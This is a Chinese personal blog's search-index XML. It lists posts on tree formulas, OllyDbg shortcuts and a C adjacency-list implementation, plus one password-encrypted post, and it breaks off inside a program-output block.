<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>如何科学上网</title>
      <link href="/2024-01-07-cb42ed54b65f/"/>
      <url>/2024-01-07-cb42ed54b65f/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bf71e4c81041ffe719a1dc8b7353aef054069e79a3d91a7c6d76ec9d75a60a2b">40f755995d5e73f3d7ebec81f1a7c8131c62ab6e73b9839c43ddfa2fdf20ae732483964d6a7eb1c16b111993277259319b4d10866767e8c68636a367dfb5054576ab1923c677a20a05dde89147da69ceaba53669e4410bdcc32977fc00516a564f75d1cee29da2e0a1b9983b36be768e134e89efef6f71823f030d4ad548f11d7c7c1bd8128bea9767529196775b7a783d682e8d7384bc1c4c6c414d20f4bf960f80ef823db5eff05bc35599f82bd5e8c0e6114d1549333085a0f603e792f21057cd4d477187067705dc34d0fd6dae7593bbb0b7203d0081afc1df5894057732939a8264b4d7f5ef21dd5d348da6ac35790e33e3e87e05b45577653c3089ad4b699e1c051d034ddc68dbd89b5b83836244e5891146a9f2ab795f56dab2dd5471abf8ee7a2707da95cc064f252a58c10efed9ac4d495435464de1787345012d1786eac99f1031dbc890f33a1075e7c312e430606cff556a973f937120a5486d3d5183f4a3c2286823b37c067436dc7bc214bff46f188d2be6dc916d8b36f354cb7c779be42cd91cc23e195b74bce61fee929e7fea88b260e99072c818615fae6582fecc079284243168ac5a10246751a80849b65dc563b722a71095f4bab55043f1ab0421633150ae96645ac5b401a10d8593210c9146a0142cd02d8a7f665d3a31ee191803524db013ebe285ceed98967e67d6ab5caba6f8c620b06d532a4499690048aadea7972cbd74d823e9f077cb37fba28b9af0b6c6e6f46ed77386c6667ecd0630cc55ae0d5fd19a4b4ce69407993dbbf5902377ddf4ae932a72396e8452ca532e5a921b921bcac9ab5ba041e23a51cb993b4bfc93d47e33543374ddd2da306ea09a753432f7490eee00b454cea35d2de0e1d1b1f381d3b83bb7c428efcfe3d9cb08f83f684a6f39aff79d727e55934b3f449e97b2e21c5772ddd461865a3bc187c04114ae88d4d500afa89a82063b0d6f0a7a9f3ad75e07d894cbcf8667304c7304e1a7d42000c7192d5c09f67e08d5052b708948234c48ea625e08a7acc3b531fdd08a0d8034f544086d42c941ece2a716f110065748e5296392aadffeef51c8a1524d5df70be4e17caec0ce9686d8ad06e08ac68fac4fc3e74efbcdcce8da1d86e85a55808f486da8f1021042220dc91cbd1583ef6274a278613b8e70365e6dc800e86ebb8d9308dba13693e606a6738507fcffc5492cc8da8b101d3d56dd2de9bcc6ee38bf304822c27683864c7210f4df2b9be35f47e292a289ea9571a1ed583d831444d5dc2aac913592d9d6b4e53353fa8bb1c868f799d5a0db37d4a8b06f09105115873ea05d5c561f6980fae5957c91d2f8ebe2fe73d2a645e443df0f79f86cf2e5e671a15328b18fc6a682177b5d2edc09c12332ccc0e1f49355d16aeead5d1cf2c2f18f0325677a102ddb2d0e79a149468671a6dbc1c856aef322a062a6e2bd3c1e1a40b91a1999c696005e7860a61580c8a3fff55f716fa47bd024e6ae494b59ec0fa5fb7f7bef657bf76d1b90c7cf857636bdf3c5d971c92d605ad88afa4bee94d808b5fc8c346c116f37b40bb65f6adfdf95a3cfe772982312201e72d740404c543d1e7d8d528c1123a47a5fd6a003380ebd7bc538b4ae1a382e4c810b7eda3e89be8ccacc51851eb74615d346cec48dfc713fc9f520365ab00339811da7c299f76a999c40883b1a3e516c7aed3f43ee98c32ea5d0b780b594e13771b9eda319015cf0086bc078807a64b0da17f0f7dd9ddd3218cf1144b2967b7ebf5c531ba86f49eb04c1a55753e00b9febaa83f22f96d6e93a98870ab9035639bf57e1f82923fbeb9c6c02f7b725f626c3bba328d3485c83ffc104d269308ba9119ad494c33a03cb350f6a071343da71cbbd7e11437af89956981b00616e71407370adf29ff4e1ad247eba8190f0970218adaa5fd1d551a6dddc08c462ff0b58e294c235a75b397844a52c2c6608b19d4988c8ad66a4d1c3c4dbfa0933cd24185f545412aed46b11534f36967dece30a3779b1a4756640016fba65aba7a38053ebee308468e7c807228c206d184461e5fa5bc63aa5e6ad2ad800cca3f81541d1645f84b576dc582b73349697fe49533d68ccf8a1220fa5c467112972231d600ea1c8d97fd422cac7458d7121d65e01c8bf5ec62efedd91942bb04adddd824a15c52f457cdca3d22c2cd85aea49aec7ac4553795fcc93d088b2987441ee01cab9d654f0eca66e979d1091f2af370eda624a0117f2432e6298a0d1071f5bbf127a261a681f6f4add25a82dfce5a3ba0cfc041fedc4fad34b2e7e3d4cd40d278e1085fad31c28268186d274faed93462c58ca5094fb2c90b0ef65242dd4fd83e8497b093c5e0aa76eb99320a3578dd915c5aa2070b00afceab96c99132f6304044b806cf037e0720360557126ec736577ea177c8bcce0011eb59766b6ad596772bd0f749ebbca106b55ab5360da32f8b17b56ac7be30383a2f339913e6227172cdf2acb5303a1798e2ab32e92bd9f4f33abbb5d9326220522e283182837e055f8862c7a45880fbc8a750996dd6e74bde51d5786b6f295fb5830e5868c6d111147001d2e2c80ead35f1c3eeb44cc3878198092360b9b2dcace83d8e6d3aab8aa216004206d41e2d8428f9651c3c74ff8699787508234a4cccdbaa3f5adb9c9e5a5f2b47ac5a83790f745c91efeb676b24d0f910e311df7e136f74c3dcaaaf3ee91345bc8b73f18bffdc91a56ab0aa6dd83ad56c06d33c5699e5e7eb2b51ac9af98ab5fa1083939faa1e06b4b81e36c5e6666e7e75a4dde96f221586fb21b9b130f2b1020bce66af923312cdcf0308ec369a2da6f08d333de9f7b8df477e868a577c252c025064a0b8e5e23cb6b8833f0f0dc454d5f41836e13f71f2ea6c8bf0da3e148cd0a14eefb57b4513ae38890c976a0415c5f9ec1e3d05df98049ad46bcf25d267b430d6e5daa1a668a118f36d122967a59c4da945584affca8f3f15190b4982ffc7ab9d3ea0eaa82191c9daa21370353d22a283c74823c3c11e31263bdc16499c3b480ef7f97c2635b3f8e99f2c45f9d5993217899283f63d6c0c6acdff487d7582c21525adcbe526d3d45e9e9ccf58a0009577277c86acbbb16d91d4630339408ab3c783be1498c9eb03770585f524cee1bab51ed9bcd2bdf07a17cdda177a40d78e215353e5e6468323398f58210aaa4f20abae15c72e6935b10cd35c6138b530978ff02365a090e09f50c9ed10ed625f6c64ec0509b1c132baa61c45d9e630bc3222fb32a5f5efd25bf41b6f4fee10e52d960a12a096576176c1cc8376f4d89cc98179faf41a483e91905e0e968f1ec3c97e89885b17b194527b3388f13230dc12ca6176d4a1e5acd60898daceaaf2319ee423dea4e8fcb481d527c64a577c94ec6ac3975e9e5a1da1f1efec877b697e438490599bf6f614f82c9ccfc9dc1412a2e30c9405baf715039d60535245971fcd64c50df83576a65d8afe07383b6ea55091bbeafebd3dc54569ea2619dd12523d5c928abe35cce0147d26527f52b692750656e4f3e26c4cfe7a89faac13cdc16d8bc6e2ac7d3d9f8ca9c85c77292eb8bb00e9dcf12524fc04919d513e7eb07246a3801d1c8f7fb8c242ac31e363d29e911eb4e43f818a8a928a73b67b140240a8c1c48c137149c3464dcf94d1c8e43d7a0c51a49abd92abb33c267037ef5223cebbdddc9548508d29eed39b9b57e2cccdc4c24fe5ec837f3e592b9c6b2d3456646329154924b5033fb1444a96596ca856033b7fc6a8ad56424e58ed8ae85e3ce7f9c217a5507af7825b826e821035e532113af730dacd9319e6ae43f42cd2a31ac7a25fdfc2ddeb38df4d0a768ef7b17e67696309915e7b9c7a2a5d80d083e36e4599dcdbadaf33b906f095fac18d8d4f6a5063bb74a77df81a7d1053e0b15773533688d7287111bf19e7be202daae90acce5307f7c01974b29afdf961fbb391dcb186829109b3ad6c8ed6f5be36d0a0801afffe6b2eca45c59decaea542ab2a8658e2878b39b146725dd6cc80dd2dcd7b47a5d283b6b3615e0dc71c712221b2815b6de7e12937cb6cd32521f54a2e6c64356dcc95bf947f2b384313eab13460f11ac639d9d5e3cd05cc9e80fe2c4412edef49a927d19b6570ad7d41ca85b3e53b706a9092d412199af59b85ddab1bb9386664f807c9337e7fcffeb17912f8a13f3b197781cf9c9d1fe5001ec009106517ef436282490067a42612cfa5af7c1e86fa42d3df609a05b3b3094f0acc2e5f3a51dd0b98a0ca1799f0c79d6c5d2aeb29b5c13d51b7e6e320fc90ebada500c8e571a4af191eafe6eeca5f82cf9c6db1de8b450bb3b5cb71b630d901f69bde4a6d868e64a059f2d1f3bdf7f381033a6c02dd0c517ccfec0059ec24fdbfcd523dc5e072d5f6e3d334101b4684048e60ff12221a6a844f68cc2f0394e31b9801dac8b5bbe4b6ef9c64cd407dca5fdce00c8990b5936ade428f176ed4a163971592418558dd06f917b97f282eae24aad27aca2d2d382d197698b71c4e01222d824899ceb798dbc682e1da63e4b8c339b7dbccbbbeeb9eb15f077e50543247d20fdb92ba1f48f07c206e0bef3dd34e528fbdd55f74484c6fa72a45b24d7c27ea88c641104b7a0e7cd0543186bc37a6a952bd8d17e7a0f948c6610d1aa0ef0935743f4bfa9cb51119d0c70f320307c8837907aec4f3a7e6397501ee70f646da456ba2b81f5663d9e3d65a6a076c1ce525651d5bea0b5fb28d3c7110a73e7110f7eb51f7ff20f4d3ff4c6e332a4c688e94f60ce052f9eef9f6c88a6347589b16521124ff5471851912786365efcb658c9d99de948cffe4a1ac632121b5e44430c1eed755878fa0b615e0e5a702c91d40b48af255e46ed699cd1377014bd0557bcbd889dc54832fc1e8f1d44a8cfd3f9f4eac5d2ddabebc1121dd4c869e1281b17e074269572981f8a28aa9902e382fb4d733e4466223a39891acac79627dd7a4b8dde5f1152f4069b0dbda997ee101782d19356038d67b7af847db9ff94fd932fc83781e1346f5cb0fe51d9720f1a3cfa7347d70e8fd21d088ce0333688bae9f0fa6152c299cb2d04538e88f9638c6442d16a28b69e1c7f9132d830b81aacd8fac2cfd682ce409a9875ea40b97623cce98b19dc837bd509cc30f16fd126aef78ca92f203cd0fe7b4f956ded56d79fb646e7b5b782cb1ccdc3374f939e0909082d36d1f9670fe5e5a83d152</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树的常见概念及公式</title>
      <link href="/2024-01-06-cdb9ff80eee9/"/>
      <url>/2024-01-06-cdb9ff80eee9/</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念">基本概念</h1><h2 id="树的定义">树的定义</h2><p>在图论中,树是一种无向图,其中任意两个顶点间存在一条唯一路径.</p><p>换句话说,没有环的连通图就是树.并且树有层次关系,其有且仅有一个根节点.</p><p>如果一个无向简单图G满足如下关系,那么G是一棵树:</p><ul><li>G是没有环的连通图</li><li>G内添加一条边则会形成一个环</li><li>G删除一条边则不再联通</li><li>G中任意2个顶点间存在唯一路径</li></ul><p>与线性表不同,树是一种非线性的结构,并且各顶点(数据项)间有一定的层次关系,一个顶点有着0个或若干个子顶点.</p><h2 id="森林">森林</h2><p>森林是m(m&gt;=0)棵互不相交的树的集合.</p><p>每棵树去掉其根节点后,剩下的部分即若干个子树,构成一个森林.</p><h1 id="常用公式">常用公式</h1><h2 id="一般的树">一般的树</h2><ol><li><code>总结点数 = 总度数 + 1</code></li></ol><h2 id="二叉树">二叉树</h2><ol><li><p>第i层有<code>2^(k-1)</code>个结点(k&gt;=1)</p></li><li><p>深度为m的二叉树最多有<code>2^m-1</code>个结点,最少有<code>m</code>个节点</p><p>最多时为<code>满二叉树</code>,最少时退化为<code>单链表</code></p></li><li><p>任意一颗二叉树,叶子结点数为<code>N0</code>,度为2结点数为<code>N2</code>,则<code>N0 = N2 + 1</code></p><p>证明: 度为1的结点数为<code>N1</code>,总结点数为<code>N</code>,则<code>N=N0+N1+N2</code>,又<code>总度数=N1*1+N2*2</code>,且<code>N=总度数+1</code>,联立即可得出.</p></li><li><p>具有<code>n</code>个结点的<code>完全二叉树</code>,其深度为<code>[log2(n)]+1</code>,其中<code>[log2(n)]</code>为向下取整</p></li><li><p>具有<code>n</code>个结点的<code>满二叉树</code>,其深度为<code>log2(n+1)</code>或<code>[log2(n)]+1</code></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构及算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 树论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024-01-03-736475e7a83d/"/>
      <url>/2024-01-03-736475e7a83d/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>链表</title>
      <link href="/2023-12-31-4708194b20cf/"/>
      <url>/2023-12-31-4708194b20cf/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 数据结构及算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OLLYDBG的学习和使用</title>
      <link href="/2023-12-30-9ee7f666a832/"/>
      <url>/2023-12-30-9ee7f666a832/</url>
      
        <content type="html"><![CDATA[<h1 id="常用快捷键">常用快捷键</h1><p>F2: 设置断点</p><p>F7: 单步跳入</p><p>F8: 单步跳过</p><p>Ctrl+F7: 可视化反复单步跳入</p><p>Ctrl+F8: 可视化反复单步跳过</p><p>Ctrl+F11: 不可视反复单步跳入</p><p>Ctrl+F12: 不可视反复单步跳过</p><p>F9: 跳出(?)</p><p>10D0</p>]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> OD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>邻接表</title>
      <link href="/2023-12-29-9c5af240e619/"/>
      <url>/2023-12-29-9c5af240e619/</url>
      
        <content type="html"><![CDATA[<p>前置知识:</p><ol><li><p>链表</p></li><li><p>指针数组</p></li></ol><h1 id="概述">概述</h1><p>邻接表存储了与每一个顶点相邻的边集的集合.换句话说,邻接表由若干个链表组成,每个链表都对应图中一个顶点,存储以该顶点为起点的边集.</p><p>其中每一个链表就称为该顶点的<code>邻接表</code>,所有的这些链表共同组成这个图的邻接表.</p><p>例如对该图建立邻接表:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231229213940793.png" alt="image-20231229213940793" style="zoom:50%;" /><p>左边为一个指针数组,存储每个链表的头指针(即第一个结点的指针),右边则为对应的邻接表,存储各个边:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231229213925777.png" alt="image-20231229213925777" style="zoom:50%;" /><p>以顶点A为例,&lt;A,B,3&gt;为其第一条出边,&lt;A,C,1&gt;为第二条出边,这2条边作为2个表项组成A的邻接表(链表).</p><p>另外,由于树也是一种特殊的图,因此邻接表也可以用于存储树.</p><h1 id="优缺点">优缺点</h1><p>优点:</p><ol><li><p>节省空间</p><p>与一般的邻接矩阵相比较而言,邻接表更节省空间.</p><p>邻接表只关注存在的边,忽略了邻接矩阵中不存在的边(为0的元素),空间复杂度为<code>O(n+m)</code>,n,m分别为顶点数和边数,即需要一个长度为<code>n</code>的表头,所有的链表共有<code>m</code>个结点存储<code>m</code>条边.</p><p>因此,邻接表很适合存储稀疏图.</p></li><li><p>方便遍历某个顶点的所有邻接点</p><p>因此很适合作为求解<code>单源最短路径</code>等问题的存储结构.</p></li></ol><p>缺点</p><ol><li>确定2点间的边信息需要遍历2个链表.</li><li>存有向图时,删除一条边需要从2个链表中进行2次删除.</li><li>当需要了解某个顶点的入度时,需要遍历整个邻接表.</li></ol><h1 id="代码实现">代码实现</h1><p>使用C语言实现邻接表的ADT.</p><p><code>AdjacencyList.h</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ADJACENCYLIST_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADJACENCYLIST_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EdgeNode</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> dest;</span><br><span class="line">    <span class="type">int</span> weight; <span class="comment">// The weight is of type int</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">EdgeNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GraphAdjList</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> vertexNum;</span><br><span class="line">    <span class="type">int</span> edgeNum;</span><br><span class="line">    <span class="type">int</span> isWeighted; <span class="comment">// 0 for unweighted graph, 1 for weighted graph</span></span><br><span class="line">    EdgeNode **adjLists;</span><br><span class="line">&#125; GraphAdjList;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a graph with n vertices</span></span><br><span class="line">GraphAdjList *<span class="title function_">createGraphAdjList</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> isWeighted)</span>;</span><br><span class="line"><span class="comment">// Destroy a graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">destroyGraphAdjList</span><span class="params">(GraphAdjList *graph)</span>;</span><br><span class="line"><span class="comment">// Add an edge to the graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">addEdgeAdjList</span><span class="params">(GraphAdjList *graph, <span class="type">int</span> u, <span class="type">int</span> v, <span class="type">int</span> w)</span>;</span><br><span class="line"><span class="comment">// Remove an edge from the graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">removeEdgeAdjList</span><span class="params">(GraphAdjList *graph, <span class="type">int</span> u, <span class="type">int</span> v)</span>;</span><br><span class="line"><span class="comment">// Print the graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printGraphAdjList</span><span class="params">(GraphAdjList *graph)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//ADJACENCYLIST_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>AdjacencyList.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AdjacencyList.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a graph with n vertices and m edges</span></span><br><span class="line">GraphAdjList *<span class="title function_">createGraphAdjList</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> isWeighted)</span> &#123;</span><br><span class="line">    GraphAdjList *graph = (GraphAdjList *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(GraphAdjList));</span><br><span class="line">    graph-&gt;vertexNum = n;</span><br><span class="line">    graph-&gt;edgeNum = <span class="number">0</span>;</span><br><span class="line">    graph-&gt;isWeighted = isWeighted;</span><br><span class="line">    graph-&gt;adjLists = (EdgeNode **) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode *) * (n + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; ++i)</span><br><span class="line">        graph-&gt;adjLists[i] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> graph;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Destroy a graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">destroyGraphAdjList</span><span class="params">(GraphAdjList *graph)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;vertexNum; ++i) &#123;</span><br><span class="line">        EdgeNode *p = graph-&gt;adjLists[i];</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            EdgeNode *q = p;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(graph-&gt;adjLists);</span><br><span class="line">    <span class="built_in">free</span>(graph);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add an edge to the graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">addEdgeAdjList</span><span class="params">(GraphAdjList *graph, <span class="type">int</span> u, <span class="type">int</span> v, <span class="type">int</span> w)</span> &#123;</span><br><span class="line">    EdgeNode *p = (EdgeNode *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">    p-&gt;dest = v;</span><br><span class="line">    p-&gt;weight = graph-&gt;isWeighted ? w : <span class="number">1</span>;</span><br><span class="line">    p-&gt;next = graph-&gt;adjLists[u];</span><br><span class="line">    graph-&gt;adjLists[u] = p;</span><br><span class="line">    ++graph-&gt;edgeNum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove an edge from the graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">removeEdgeAdjList</span><span class="params">(GraphAdjList *graph, <span class="type">int</span> u, <span class="type">int</span> v)</span> &#123;</span><br><span class="line">    EdgeNode *p = graph-&gt;adjLists[u];</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;dest == v) &#123;</span><br><span class="line">        graph-&gt;adjLists[u] = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        --graph-&gt;edgeNum;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;next-&gt;dest == v) &#123;</span><br><span class="line">            EdgeNode *q = p-&gt;next;</span><br><span class="line">            p-&gt;next = q-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">            --graph-&gt;edgeNum;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Print the graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printGraphAdjList</span><span class="params">(GraphAdjList *graph)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Vertex number: %d\n&quot;</span>, graph-&gt;vertexNum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Edge number: %d\n&quot;</span>, graph-&gt;edgeNum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Weighted: %s\n&quot;</span>, graph-&gt;isWeighted ? <span class="string">&quot;Yes&quot;</span> : <span class="string">&quot;No&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;vertexNum; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: &quot;</span>, i);</span><br><span class="line">        EdgeNode *p = graph-&gt;adjLists[i];</span><br><span class="line">        <span class="keyword">if</span>(p == <span class="literal">NULL</span>) <span class="built_in">putchar</span>(<span class="string">&#x27;^&#x27;</span>);</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, p-&gt;dest);</span><br><span class="line">            <span class="keyword">if</span> (graph-&gt;isWeighted)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;(%d)&quot;</span>, p-&gt;weight);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>test.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This code is used to test functionality.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AdjacencyList.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m); <span class="comment">// 输入图的顶点数和弧(有向边)数</span></span><br><span class="line">    GraphAdjList *graph = createGraphAdjList(n, <span class="number">1</span>); <span class="comment">// 初始化为n个顶点的带权图</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> u, v, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;u, &amp;v, &amp;w);</span><br><span class="line">        addEdgeAdjList(graph, u, v, w); <span class="comment">// 添加一条弧</span></span><br><span class="line">    &#125;</span><br><span class="line">    printGraphAdjList(graph); <span class="comment">// 输出邻接表</span></span><br><span class="line">    destroyGraphAdjList(graph); <span class="comment">// 销毁邻接表</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 